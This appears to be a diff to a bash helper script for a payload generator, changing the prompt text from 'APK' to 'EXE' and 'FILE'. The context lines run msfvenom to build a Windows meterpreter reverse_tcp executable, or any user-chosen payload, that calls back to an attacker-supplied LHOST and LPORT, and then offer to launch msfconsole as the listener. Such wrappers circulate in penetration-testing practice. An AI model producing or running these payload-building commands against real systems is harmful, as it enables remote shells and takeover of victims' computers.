@@ -51,7 +51,7 @@ if [ $p = 2 ]
 then
   read -p "ENTER LPORT :" lp
   read -p "ENTER LHOST :" lh
-  read -p "ENTER NAME OF APK WITH EXTENSION : " pn
+  read -p "ENTER NAME OF EXE WITH EXTENSION : " pn
   msfvenom -p windows/meterpreter/reverse_tcp lhost=$lh lport=$lp -f exe > $pn
   read -p "DO YOU WANT TO START MSFCONSOLE (y/n):" s
   if [ $s = y ]
@@ -72,7 +72,7 @@ if [ $p = 3 ]
 then
   read -p "ENTER LPORT :" lp
   read -p "ENTER LHOST :" lh
-  read -p "ENTER NAME OF APK WITH EXTENSION : " pn
+  read -p "ENTER NAME OF FILE WITH EXTENSION : " pn
   read -p "Enter your payload: " pl
   msfvenom -p $pl lhost=$lh lport=$lp R > $pn
   read -p "DO YOU WANT TO START MSFCONSOLE (y/n):" s
